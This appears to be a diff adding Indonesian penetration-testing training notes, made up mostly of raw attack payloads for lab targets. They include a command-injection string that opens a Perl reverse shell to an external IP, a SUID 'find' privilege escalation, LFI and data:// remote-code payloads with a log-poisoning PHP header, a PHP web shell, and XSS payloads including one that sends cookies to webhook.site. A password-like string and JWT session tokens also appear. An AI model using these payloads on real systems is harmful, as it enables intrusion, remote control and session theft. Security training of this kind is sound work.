@@ -1,0 +1,98 @@
+Pelatihan Pentest
+
+https://ipinfo.io/json
+
+csrf poc generator
+csrf shark github
+
+jwt.io
+
+untuk reverse tcp: nc, bash, python, python3, perl
+￼
+pentestmonkey.net reverse shell
+
+159.223.86.155 : NgajarPT2026ya
+
+google.com;perl -e 'use Socket;$i="159.223.86.155";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+reverse shell generator online
+￼
+
+privilege escalation: /usr/bin/find . -exec /bin/sh -p \; -quit
+LinPeas
+￼
+gtfobins
+￼
+
+￼
+
+$ find / -perm -4000 -type f 2>/dev/null
+
+￼
+
+
+Path Traversal dan LFI
+
+http://lab.latihanpentest.web.id:3713/?lang=php://filter/convert.base64-encode/resource=config
+
+￼
+
+
+hacktrick lfi to rce
+
+￼
+
+GET /?page=data://text/plain,<?php+system('ls');+?> HTTP/1.1
+Host: lab.latihanpentest.web.id:3704
+User-Agent: <?php system($_GET[c]);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: session_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgyMzcyNjMyfQ.FPZfjgqW3w529k_UI59s4Mcqx3Hp2MDNZrDeM8HajCI; user_prefs=%7B%22theme%22%3A%22light%22%2C%22lang%22%3A%22id%22%7D; session=9qq10r2ehzp; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgyMzczMTUxfQ.EpNz4fm04T7rzIM2Ynow63_dIfFoeILKeCleSPCukP8; PHPSESSID=b198fec8484f0057986d64349cc34db8
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+￼
+
+
+File Upload
+
+http://lab.latihanpentest.web.id:3611/uploads/testimage.php?cmd=id
+
+￼
+
+
+<?php system($_GET['cmd']); ?>
+
+XSS
+
+<script>alert(123)</script>
+
+<script>document.cookie</script>
+
+<script>document.domain</script>
+
+<script>print()</script>
+
+<script>
+fetch('https://webhook.site/b6cd2f7a-deb7-40bb-9689-48a7a69f6d1d'+'?c='+encodeURIComponent(document.cookie));
+</script>
+
+<img src=x onerror="alert(1)">
+
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<svg/onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video autoplay onloadstart=alert(1)><source>
+<audio src onloadstart=alert(1)>
+
+https://vulnlib.vulnapp.id/search?q=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E
+
+FLAG{SQL1_L0g1n_Byp4ss3d}
+
